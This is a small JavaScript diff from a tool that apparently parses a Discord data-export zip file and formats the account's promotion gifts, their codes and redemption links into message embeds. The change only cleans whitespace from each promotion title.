@@ -110,7 +110,7 @@ const json = async (zipFile) => {
       embeds.push({
         title: 'Discord Promotions',
         description: discordAccountInfo.gifts.map(gift => {
-          return `🎁 **${gift.promotion.outbound_title}**\n🔗 \`\`${gift.code}\`\` ([Redeem](${gift.promotion.outbound_redemption_page_link}))`;
+          return `🎁 **${gift.promotion.outbound_title.trim().replaceAll(/[\t\n\r]/gi, '')}**\n🔗 \`\`${gift.code}\`\` ([Redeem](${gift.promotion.outbound_redemption_page_link}))`;
         }).join('\n')
       });
     }
